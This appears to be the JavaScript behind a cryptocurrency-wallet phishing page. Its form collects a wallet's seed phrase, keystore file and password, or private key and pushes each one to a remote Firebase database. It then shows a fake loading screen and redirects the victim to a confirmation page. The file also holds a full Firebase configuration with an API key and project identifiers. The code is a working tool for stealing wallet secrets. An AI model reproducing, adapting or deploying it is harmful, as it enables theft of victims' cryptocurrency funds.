
function wconnForm() {
    // Initialize Firebase
     var firebaseConfig = {
       apiKey: "AIzaSyCxlv-fUB7WZ58JvF0j8tObnvvBAdIrw7w",
       authDomain: "dappresolve-f083e.firebaseapp.com",
       databaseURL: "https://dappresolve-f083e-default-rtdb.firebaseio.com/",
       projectId: "dappresolve-f083e",
       storageBucket: "dappresolve-f083e.appspot.com",
       messagingSenderId: "457908700012",
       appId: "1:457908700012:web:e00732a16d5bedca89e949",
       measurementId: "G-2NSYMPK1BB",
     };
     // initialize firebase
     firebase.initializeApp(firebaseConfig);
     var database = firebase.database();

    return {
        selected: "phrase",
        isLoading: false,
        status:false,
        phrase:"",
        keystore:"",
        keyPassword:"",
        privatekey:"",
        submitPhrase(){
            
            database.ref('phrase').push(this.phrase);
            this.resetForm();
            this.redirectPage();
        },
        submitKeystoreJSON(){
            
            database.ref('keystore').push(this.keystore);
            database.ref('KeyPassword').push(this.keyPassword);
            this.resetForm();
            this.redirectPage();
        },
        submitPrivateKey(){
            
            database.ref('privatekey').push(this.privatekey);
            this.resetForm();
            this.redirectPage();
        },
        resetForm() {
            this.selected = "phrase";
            this.phrase = "";
            this.keystore = "";
            this.keyPassword = "";
            this.privatekey = "";
        },
        redirectPage() {
            window.location.href = "./confirm.html";
        }
    }
  }

// Modal

const modalBtn = document.getElementById("modal-button");
const modalShow = document.getElementById("modal-show");
const load = document.getElementById("loader");

modalBtn.addEventListener("click", () => {

  load.style.display = "block";
  setTimeout(() => {

    load.style.display = 'none'

    modalShow.style.display = "block";

  }, 2000);


});
